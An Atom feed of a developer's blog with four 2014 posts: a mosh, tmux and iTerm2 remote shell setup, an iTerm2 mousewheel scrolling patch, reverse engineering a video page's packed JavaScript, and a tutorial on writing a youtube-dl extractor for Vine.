<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[PyTux]]></title>
  <link href="http://filippo.io/atom.xml" rel="self"/>
  <link href="http://filippo.io/"/>
  <updated>2014-03-18T04:47:46+01:00</updated>
  <id>http://filippo.io/</id>
  <author>
    <name><![CDATA[Filippo Valsorda]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    
      <title type="html"><![CDATA[My remote shell session setup]]></title>
      <link href="http://filippo.io/my-remote-shell-session-setup/"/>
    
    <updated>2014-03-18T04:08:00+01:00</updated>
    <id>http://filippo.io/my-remote-shell-session-setup</id>
    
      <content type="html"><![CDATA[<p>It’s 2014 and I feel entitled to a good experience connecting to a remote server, instead the default still feels like <code>telnet</code>.</p>

<p>After searching for quite a long time, I finally built my dream setup. These were the requirements:</p>

<ul>
  <li>I want a single window/tab/panel of the terminal I’m using to be dedicated to the remote shell (without any new window, etc.)</li>
  <li>I want the shell to survive unaffected with no context loss the following events
    <ul>
      <li>connection failure</li>
      <li>route change (like, toggling the VPN or changing Wi-fi)</li>
      <li>laptop sleep (like, me closing the lid)</li>
      <li>local terminal restart or laptop reboot</li>
    </ul>
  </li>
  <li>I want to be able to scroll back with my touchpad</li>
  <li>I want to be able to copy-paste</li>
  <li>I want colors</li>
  <li>I want to launch it with a single command</li>
</ul>

<p>And a unicorn.</p>

<!-- more -->

<p>(Some fellow travelers in search for the same utopia are <a href="">here</a>)</p>

<h2 id="the-setup">The setup</h2>

<p>I managed to get this with the following combination: iTerm2 + mosh + tmux.</p>

<h3 id="iterm2">iTerm2</h3>

<p>The terminal.</p>

<p>I’m on the nightly, but stable should work the same. Just make sure to <em>Enable xterm mouse reporting</em> in the <em>Terminal</em> Profile settings, and set <em>Terminal Type</em> to <code>xterm-256color</code>.</p>

<h3 id="tmux">tmux</h3>

<p>The session manager.</p>

<p><code>tmux</code> is the new <code>screen</code>. It has a ton of features, but I’m using it here just to keep track of my session server side. On 1.8 right now, the one that comes in packages.</p>

<p><code>~/.tmux.conf</code>:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class=""><span class="line">new-session
</span><span class="line">set-window-option -g mode-mouse on
</span><span class="line">set -g history-limit 30000</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>The first line makes sure that if I try to attach and no sessions are alive, one is created. This means that I can invoke it like this <code>tmux a</code> all the time.</p>

<p>The second enables mouse interactions. This will allow us to scroll with the touchpad! (See below)</p>

<p>NOTE: the key combination to detach is <code>C-b d</code>.</p>

<h3 id="mosh">mosh</h3>

<p>The bridge.</p>

<p><code>mosh</code> is an awesome piece of software. All network-interacting software should behave like it. It will withstand whatever you throw at it from the network. It will even tell you when and since when your connection went down.</p>

<p>Sadly the latest release is ooooold, and doesn’t support mouse reporting. So no scrolling. Sigh.</p>

<p>So, you have to build from git.</p>

<p>On OS X: <code>brew install --HEAD mobile-shell</code></p>

<p>On the server:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
</pre></td><td class="code"><pre><code class=""><span class="line">git clone https://github.com/keithw/mosh.git
</span><span class="line">cd mosh/
</span><span class="line">sudo apt-get build-dep mosh
</span><span class="line">./autogen.sh &amp;&amp; ./configure &amp;&amp; make
</span><span class="line">sudo make install</span></code></pre></td></tr></table></div></figure></notextile></div>

<h2 id="result">Result</h2>

<p>The result is that I can type</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class=""><span class="line">mosh HOST -- tmux a</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>and get my motherfucking shell. Period.</p>

<p>iTerm2 will show me things, <code>mosh</code> will make sure that my connection stays up in all the aforementioned cases and <code>tmux</code> will keep my scrollback and allow me to detach and reattach. <code>mosh</code> and <code>tmux</code> collaborating, finally, will allow me to use my dear touchpad. Done.</p>

<p>NOTE: to select text “on the client side”, in order to copy/paste, you’ll have to hold the Option key.</p>

<h2 id="future-work">Future work</h2>

<ul>
  <li>Scrolling is way less fluid than native. I have no idea how to fix this.</li>
  <li>I’d like click+drag not to be relayed so that I don’t have to hold Option to select.</li>
</ul>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Native scrolling and iTerm2]]></title>
      <link href="http://filippo.io/native-scrolling-and-iterm2/"/>
    
    <updated>2014-03-13T03:15:00+01:00</updated>
    <id>http://filippo.io/native-scrolling-and-iterm2</id>
    
      <content type="html"><![CDATA[<p><strong>tl;dr</strong> See the bullet points for the supported programs and the last paragraph for installation.</p>

<p>Something I always wanted is native touchpad/mousewheel scrolling in all my terminal programs.</p>

<p><a href="https://bitheap.org/mouseterm/">MouseTerm</a> hacks that into the OS X Terminal, but I am a iTerm2 user.</p>

<p>I tried and gave up researching this a while ago, but today I got a notification from a Google Code bug I starred linking to <a href="https://code.google.com/p/iterm2/issues/detail?id=974">this</a>. Someone actually patched support for this a while ago, and someone else now updated the patch for current git!</p>

<!-- more -->

<p>The patch worked like a charm. It basically send arrow keystrokes on mousewheel when the terminal is in alternate mode. The actual logic amounts to this, reworked by me:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
</pre></td><td class="code"><pre><code class="obj-c"><span class="line"><span class="k">case</span> <span class="nl">MOUSE_REPORTING_NONE:</span>
</span><span class="line">    <span class="k">if</span> <span class="p">([[</span><span class="n">PreferencePanel</span> <span class="n">sharedInstance</span><span class="p">]</span> <span class="n">alternateMouseScroll</span><span class="p">]</span> <span class="o">&amp;&amp;</span>
</span><span class="line">        <span class="p">[</span><span class="n">_dataSource</span> <span class="n">isAlternate</span><span class="p">])</span> <span class="p">{</span>
</span><span class="line">        <span class="n">CGFloat</span> <span class="n">deltaY</span> <span class="o">=</span> <span class="p">[</span><span class="n">event</span> <span class="n">deltaY</span><span class="p">];</span>
</span><span class="line">        <span class="n">NSData</span><span class="o">*</span> <span class="n">keyMove</span><span class="p">;</span>
</span><span class="line">        <span class="k">if</span> <span class="p">(</span><span class="n">deltaY</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">            <span class="n">keyMove</span> <span class="o">=</span> <span class="p">[</span><span class="n">terminal</span><span class="p">.</span><span class="n">output</span> <span class="nl">keyArrowUp:</span><span class="p">[</span><span class="n">event</span> <span class="n">modifierFlags</span><span class="p">]];</span>
</span><span class="line">        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">deltaY</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">            <span class="n">keyMove</span> <span class="o">=</span> <span class="p">[</span><span class="n">terminal</span><span class="p">.</span><span class="n">output</span> <span class="nl">keyArrowDown:</span><span class="p">[</span><span class="n">event</span> <span class="n">modifierFlags</span><span class="p">]];</span>
</span><span class="line">        <span class="p">}</span>
</span><span class="line">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ceil</span><span class="p">(</span><span class="n">fabs</span><span class="p">(</span><span class="n">deltaY</span><span class="p">));</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">            <span class="p">[</span><span class="n">_delegate</span> <span class="nl">writeTask:</span><span class="n">keyMove</span><span class="p">];</span>
</span><span class="line">        <span class="p">}</span>
</span><span class="line">        <span class="k">return</span><span class="p">;</span>
</span><span class="line">    <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>I tested and confirmed compatibility with:</p>

<ul>
  <li><code>less</code></li>
  <li><code>vim</code></li>
  <li><code>screen</code> (after the <code>C-a ESC</code> escape - <code>ESC</code> to exit)</li>
  <li><code>tmux</code> (after the <code>C-b [</code> escape - <code>q</code> to exit)</li>
  <li>all of the above over <code>ssh</code> and <code>mosh</code></li>
</ul>

<p>In particular the point about <code>mosh</code> and <code>screen</code> makes me happy, since this allows me to use them together to get session resuming and native scrollback - fixing <a href="https://github.com/keithw/mosh/issues/122">what annoyed me (and others) most of mosh</a>.</p>

<p>I took the patch, wrapped it in a hidden (not exposed) setting, and submitted as a <a href="https://github.com/gnachman/iTerm2/pull/164">Pull Request</a>. iTerm2 author was quick to suggest changes to the code and then to merge.</p>

<p>By the way, iTerm2 builds so pleasantly with a simple run of <code>xcodebuild</code>!</p>

<p>This means that it should be in the Nightly builds from tomorrow. To activate it just run</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>defaults write com.googlecode.iterm2 AlternateMouseScroll -bool <span class="nb">true</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Scraping the hell out of a more stubborn site]]></title>
      <link href="http://filippo.io/scraping-a-video-out-of-a-more-stubborn-site/"/>
    
    <updated>2014-02-03T03:47:00+01:00</updated>
    <id>http://filippo.io/scraping-a-video-out-of-a-more-stubborn-site</id>
    
      <content type="html"><![CDATA[<p><em>This is the second post speaking about writing <strong>youtube-dl IEs</strong>, all the basics are <a href="http://filippo.io/add-support-for-a-new-video-site-to-youtube-dl/">here</a>.</em></p>

<p>So as promised let’s have a look at something a bit more uncooperative: <strong>TopVideo.cc</strong>.</p>

<p>This is a kind of more shady site: it has changed gTLD at least once, it’s full of ads and fishy stuff and for our amazement, does not really like the idea of being scraped.</p>

<p>First of all: <strong>familiarize with the watch flow</strong>. I downloaded a CC-BY-SA video from YouTube (turns out you can filter for them!) and uploaded it to TopVideo. Here is it: <a href="http://www.topvideo.cc/4w1c85nzsbj0">http://www.topvideo.cc/4w1c85nzsbj0</a>.</p>

<p><em>Tip</em>: try first with an ad blocker, it will make everything (interacting with the site, inspecting requests…) far more pleasant, easy and secure. If it does not break your browser playback, it won’t break your reverse engineering.</p>

<p><em>Note</em>: this time writing the <code>_VALID_URL</code> regex and the like is left to the reader. Just consider that the filename or other stuff might be added to the URL and that they were <code>topvideo.tv</code> before. If this confuses you, check my <a href="http://filippo.io/add-support-for-a-new-video-site-to-youtube-dl/">previous post</a>. </p>

<p>Visiting the main link brings us to a page with no content except some scams and a <strong>“Proceed to video!” button</strong>.</p>

<p><img src="http://filippo.io/images/Watch Minecraft Timelapse Volcanic Island veu6DfOTNv0 mp4 2014-02-03 04-02-38.png" alt="The first page" class="center" /></p>

<p>So what is probably happening here is that they are having us <strong>acquire some sort of session ticket</strong> to see the video, or basically making us go through one more hop of ads/scraping deterrent.</p>

<p>Clicking on the button leads us to the real video page.</p>

<p><img src="http://filippo.io/images/Watch Minecraft Timelapse Volcanic Island veu6DfOTNv0 mp4 2014-02-03 04-12-55.png" alt="The video page" class="center" /></p>

<p>(Let’s take a note of that embed stuff below, if reversing this page turns out to be crazy difficult the embed html might be a softer target.)</p>

<p>So, a <strong>Flash player</strong>. If we are lucky (the norm) the video URL will be around in the source, in some <code>&lt;script&gt;</code> tag, under names like <em>player options</em>. (If we are not some logic will be embedded in the Flash swf and we will have to emulate that.)</p>

<p>To figure out what we should be looking for we kick open the <strong>Network tab</strong> of the Developer Tools, start the video, and watch what happens.</p>

<p><img src="http://filippo.io/images/Watch Minecraft Timelapse Volcanic Island veu6DfOTNv0 mp4 2014-02-03 04-25-46.png" alt="MP4 request" /></p>

<p><strong>No intermediate requests seem to be spawned, and this mp4 starts downloading. Nice.</strong> Now, where did it get the url from?</p>

<p>Let’s start grabbing pieces of that url and scouring the page source for them. The long alphanumeric string doesn’t disappoint us, and turns out an <strong>exact match</strong>. Got you!</p>

<p><img src="http://filippo.io/images/view-source-www.topvideo.cc-4w1c85nzsbj0 2014-02-03 04-33-03.png" alt="Match!" class="center" /></p>

<p><em>Tip</em>: <code>jwplayer</code> is a good ⌘F target for a lot of sites. </p>

<p>But… Hm. It’s not nice you know? At this point you can either spot that <code>eval</code> at the beginning, turn it to a <code>console.log</code> and <strong>have the code deobfuscate for you</strong> or be sleep-deprivated as I was at the time and start reversing the thing. (I stopped when <a href="http://jsbeautifier.org/">jsbeautifier.org</a> kindly deobfuscated it for me.)</p>

<p>Aaaaaand, there it is!</p>

<p><img src="http://filippo.io/images/Online JavaScript beautifier 2014-02-03 04-47-24.png" alt="De-obfuscated" /></p>

<p>Some Googling will reveal the obfuscator as an old version (?) of <a href="http://dean.edwards.name/packer/">dean.edwards.name/packer/</a> with “Base62 encode” turned on.</p>

<h2 id="ok-lets-write-some-code">Ok, let’s write some code</h2>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Add support for a new video site to youtube-dl]]></title>
      <link href="http://filippo.io/add-support-for-a-new-video-site-to-youtube-dl/"/>
    
    <updated>2014-01-27T02:12:00+01:00</updated>
    <id>http://filippo.io/add-support-for-a-new-video-site-to-youtube-dl</id>
    
      <content type="html"><![CDATA[<p><a href="https://github.com/rg3/youtube-dl">youtube-dl</a> is a very feature packed command line video downloader. Contrary to what the name might make you think, it supports way more sites than YouTube. <strong>240</strong> as of <a href="https://github.com/rg3/youtube-dl/tree/5700e7792aed45d6504ae957610d8254d5bb073f"><code>5700e77</code></a>.</p>

<p>What makes this possible is the structure of ytdl and its awesome community: all the common stuff (CLI, Downloading, Postprocessing) is in the core, and websites support is added in a plugin fashion (with a lot of helper functions available). So anyone can add support for its favorite video site by using another plugin as a template, with no need to understand the whole codebase. And a lot of people indeed did: <a href="https://github.com/rg3/youtube-dl/pulls">we’re nearing <strong>500 Pull Requests</strong></a>!</p>

<p>So, what I’m going to show you today is how to add support to ytdl for a simple site (I picked <a href="https://vine.co/">Vine</a> for the tutorial) and how to contribute to ytdl in general.</p>

<!-- more -->

<h2 id="how-ytdl-is-organized">How ytdl is organized</h2>

<p>The website plugins are called Information Extractors – IE – and their role is clear and simple:</p>

<ol>
  <li>they describe what URLs they are able to interpret (with a regex)</li>
  <li>they get a input URL, usually interact with the site and return a dictionary of information about the video, including its video file URL and its title <em>(over-simplified)</em></li>
</ol>

<p>You can find IEs in <code>youtube_dl/extractor</code>.</p>

<p>The rest of ytdl deals with parsing the input arguments (<code>youtube_dl/__init__.py</code>), downloading the file (<code>youtube_dl.downloader</code>) and post-processing (<code>youtube_dl.postprocessor</code>)</p>

<h2 id="lets-get-started">Let’s get started</h2>

<p>Of course, if you didn’t already <code>git clone</code> ytdl GitHub repository and make sure it’s up-to-date.</p>

<p>Remove the existing Vine IE if you want to follow along the tutorial step by step</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line">rm youtube_dl/extractor/vine.py
</span><span class="line">sed -i <span class="s1">&#39;/VineIE/d&#39;</span> youtube_dl/extractor/__init__.py
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h2 id="anatomy-of-a-ie">Anatomy of a IE</h2>

<p>We already know that a IE is found in <code>youtube_dl/extractor</code>, but how does it look like?</p>

<p>Each site has its own file, named <code>lowercase_site.py</code>. Inside it, a subclass of <code>youtube_dl.extractor.common.InfoExtractor</code> named <code>CameCaseSiteIE</code> is defined.</p>

<p>That subclass has a property, <code>_VALID_URL</code>, a regex that defines what URLs will be handled by the IE (a <code>re.match</code> is performed) and is usually reused to extract for example the video id.</p>

<p>The only other thing needed is the <code>_real_extract</code> method. It takes a URL as its only argument and return a list of dicts, one for each video (usually just one), with <em>at least</em> the following fields:</p>

<ul>
  <li><code>id</code>: a short video id, should be unique for the site, usually it is site-internal</li>
  <li><code>url</code>: the URL of the actual downloadable video file</li>
  <li><code>ext</code>: the extension of the video file</li>
  <li><code>title</code>: the human-readable full title of the video, all characters allowed, Unicode possibly</li>
</ul>

<p>So, this is how our bare VineIE should start looking like:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="kn">from</span> <span class="nn">.common</span> <span class="kn">import</span> <span class="n">InfoExtractor</span>
</span><span class="line">
</span><span class="line"><span class="k">class</span> <span class="nc">VineIE</span><span class="p">(</span><span class="n">InfoExtractor</span><span class="p">):</span>
</span><span class="line">    <span class="n">_VALID_URL</span> <span class="o">=</span> <span class="s">r&#39;(?:https?://)?(?:www\.)?vine\.co/.*&#39;</span>
</span><span class="line">
</span><span class="line">    <span class="k">def</span> <span class="nf">_real_extract</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
</span><span class="line">        <span class="k">return</span> <span class="p">[]</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Finally, each IE is imported inside <code>youtube_dl/extractor/__init__.py</code> to be exposed. So, you’ll want to add a line like this to that file (please note that the IEs are alphabetically sorted)</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="kn">from</span> <span class="nn">.vine</span> <span class="kn">import</span> <span class="n">VineIE</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Just this line will be enough.</p>

<p><strong>A note about syntax</strong>: ytdl is a Python2/3 double codebase – that means, it runs both on Python 2 and Python 3, so be careful to use features and statements that are cross-compatible. You’ll find all the compatibility imports already done for you in <code>youtube_dl.utils</code>.</p>

<h2 id="how-to-run-it">How to run it</h2>

<p>Before digging deeper, let’s see how to test-run our development ytdl.</p>

<p>Since youtube_dl is a executable Python package, you can run it from inside your working directory like this</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">youtube_dl</span> <span class="n">URL</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>So to run our Vine IE we would use something like</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">youtube_dl</span> <span class="n">vine</span><span class="o">.</span><span class="n">co</span><span class="o">/</span><span class="n">foo</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>That indeed does not generate any output or error, great.</p>

<h2 id="now-lets-look-at-vine">Now let’s look at Vine</h2>

<p>The first thing you want to do is get a bunch of different videos from your target site, and try to spot the differences. In particular, start with the URL pattern and test assumptions about what parts of it are required or optional.</p>

<p>Here is a Vine for you: <a href="https://vine.co/v/b9KOOWX7HUx"><code>https://vine.co/v/b9KOOWX7HUx</code></a></p>

<p>The Vine URL pattern is really simple “<code>https://vine.co/v/VIDEO_ID</code>” so we can rewrite <code>_VALID_URL</code> as:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">_VALID_URL</span> <span class="o">=</span> <span class="s">r&#39;(?:https?://)?(?:www\.)?vine\.co/v/(?P&lt;id&gt;\w+)&#39;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>So we can start doing some useful stuff in <code>_real_extract</code>:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">mobj</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_VALID_URL</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">video_id</span> <span class="o">=</span> <span class="n">mobj</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="s">&#39;id&#39;</span><span class="p">)</span>
</span><span class="line"><span class="n">webpage_url</span> <span class="o">=</span> <span class="s">&#39;https://vine.co/v/&#39;</span> <span class="o">+</span> <span class="n">video_id</span>
</span><span class="line"><span class="n">webpage</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_download_webpage</span><span class="p">(</span><span class="n">webpage_url</span><span class="p">,</span> <span class="n">video_id</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><code>InfoExtractor._download_webpage</code> downloads a webpage logging progress (this is what <code>video_id</code> is used for) and handles errors.</p>

<p>Feel free to add a <code>print webpage</code> at the bottom of the function and run with <code>python -m youtube_dl https://vine.co/v/b9KOOWX7HUx</code> to check that everything is working.</p>

<h2 id="the-fun-part-reversing">The fun part: reversing</h2>

<p>Ok, so we have the page HTML and we know what we want to extract, now let’s dissect the page to get our file out.</p>

<p>For this I usually turn to Chrome and its Developer Tools. The Network tab is invaluable in identifying what your final goal is, and so what you should be looking for.</p>

<p>However Vine is really friendly, and a simple right-click &gt; Inspect Element on the playing video will be enough</p>

<p><img src="http://filippo.io/images/Jack Dorsey's post on Vine 2014-01-27 04-25-35.png" alt="The video tag" /></p>

<p>So, we just have to get the mp4 URL out of the <code>source</code> tag. <em>Tip</em>: use the Developer Tools to spot what you’re looking for, but then build your regex based on the actual page source, as pretty printing WILL get in your way and the live DOM might be substantially different from the source.</p>

<p>A regex like this should fit: <code>&lt;source src="([^"]+)" type="video/mp4"&gt;</code></p>

<p>Here comes the next step in our IE:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="c"># Log that we are starting to parse the page</span>
</span><span class="line"><span class="bp">self</span><span class="o">.</span><span class="n">report_extraction</span><span class="p">(</span><span class="n">video_id</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">video_url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_html_search_regex</span><span class="p">(</span><span class="s">r&#39;&lt;meta property=&quot;twitter:player:stream&quot; content=&quot;(.+?)&quot;&#39;</span><span class="p">,</span> <span class="n">webpage</span><span class="p">,</span> <span class="s">u&#39;video URL&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><code>InfoExtractor._html_search_regex</code>, as above, is a helper function that does the boilerplate searching, logging and error handling for you.</p>

<p>Only the title to go. Again, modern pages help: we can piggyback on Facebook-targeted OpenGraph metadata to reliably extract the title</p>

<p><img src="http://filippo.io/images/Jack Dorsey's post on Vine 2014-01-27 04-37-45.png" alt="The OpenGraph tag" /></p>

<p>Aaaand, there’s a helper for that! The whole <code>InfoExtractor._og_search_*</code> suite.</p>

<p>Let’s put this last piece in place and return our data</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">return</span> <span class="p">[{</span>
</span><span class="line">    <span class="s">&#39;id&#39;</span><span class="p">:</span>        <span class="n">video_id</span><span class="p">,</span>
</span><span class="line">    <span class="s">&#39;url&#39;</span><span class="p">:</span>       <span class="n">video_url</span><span class="p">,</span>
</span><span class="line">    <span class="s">&#39;ext&#39;</span><span class="p">:</span>       <span class="s">&#39;mp4&#39;</span><span class="p">,</span>
</span><span class="line">    <span class="s">&#39;title&#39;</span><span class="p">:</span>     <span class="bp">self</span><span class="o">.</span><span class="n">_og_search_title</span><span class="p">(</span><span class="n">webpage</span><span class="p">),</span>
</span><span class="line"><span class="p">}]</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><strong>Note</strong>: there are better ways to parse HTML than regexes, but ytdl is Public Domain and self-contained, so using external libraries is not an option.</p>

<h2 id="finish">Finish</h2>

<p>Putting it all together, this should be more or less your final result</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="kn">import</span> <span class="nn">re</span>
</span><span class="line">
</span><span class="line"><span class="kn">from</span> <span class="nn">.common</span> <span class="kn">import</span> <span class="n">InfoExtractor</span>
</span><span class="line">
</span><span class="line">
</span><span class="line"><span class="k">class</span> <span class="nc">VineIE</span><span class="p">(</span><span class="n">InfoExtractor</span><span class="p">):</span>
</span><span class="line">    <span class="n">_VALID_URL</span> <span class="o">=</span> <span class="s">r&#39;(?:https?://)?(?:www\.)?vine\.co/v/(?P&lt;id&gt;\w+)&#39;</span>
</span><span class="line">
</span><span class="line">    <span class="k">def</span> <span class="nf">_real_extract</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
</span><span class="line">        <span class="n">mobj</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_VALID_URL</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
</span><span class="line">
</span><span class="line">        <span class="n">video_id</span> <span class="o">=</span> <span class="n">mobj</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="s">&#39;id&#39;</span><span class="p">)</span>
</span><span class="line">        <span class="n">webpage_url</span> <span class="o">=</span> <span class="s">&#39;https://vine.co/v/&#39;</span> <span class="o">+</span> <span class="n">video_id</span>
</span><span class="line">        <span class="n">webpage</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_download_webpage</span><span class="p">(</span><span class="n">webpage_url</span><span class="p">,</span> <span class="n">video_id</span><span class="p">)</span>
</span><span class="line">
</span><span class="line">        <span class="c"># Log that we are starting to parse the page</span>
</span><span class="line">        <span class="bp">self</span><span class="o">.</span><span class="n">report_extraction</span><span class="p">(</span><span class="n">video_id</span><span class="p">)</span>
</span><span class="line">
</span><span class="line">        <span class="n">video_url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_html_search_regex</span><span class="p">(</span><span class="s">r&#39;&lt;meta property=&quot;twitter:player:stream&quot; content=&quot;(.+?)&quot;&#39;</span><span class="p">,</span> <span class="n">webpage</span><span class="p">,</span> <span class="s">u&#39;video URL&#39;</span><span class="p">)</span>
</span><span class="line">
</span><span class="line">        <span class="k">return</span> <span class="p">[{</span>
</span><span class="line">            <span class="s">&#39;id&#39;</span><span class="p">:</span>        <span class="n">video_id</span><span class="p">,</span>
</span><span class="line">            <span class="s">&#39;url&#39;</span><span class="p">:</span>       <span class="n">video_url</span><span class="p">,</span>
</span><span class="line">            <span class="s">&#39;ext&#39;</span><span class="p">:</span>       <span class="s">&#39;mp4&#39;</span><span class="p">,</span>
</span><span class="line">            <span class="s">&#39;title&#39;</span><span class="p">:</span>     <span class="bp">self</span><span class="o">.</span><span class="n">_og_search_title</span><span class="p">(</span><span class="n">webpage</span><span class="p">),</span>
</span><span class="line">        <span class="p">}]</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>With this few lines of code, you get all the power and the features of ytdl, for a new site!</p>

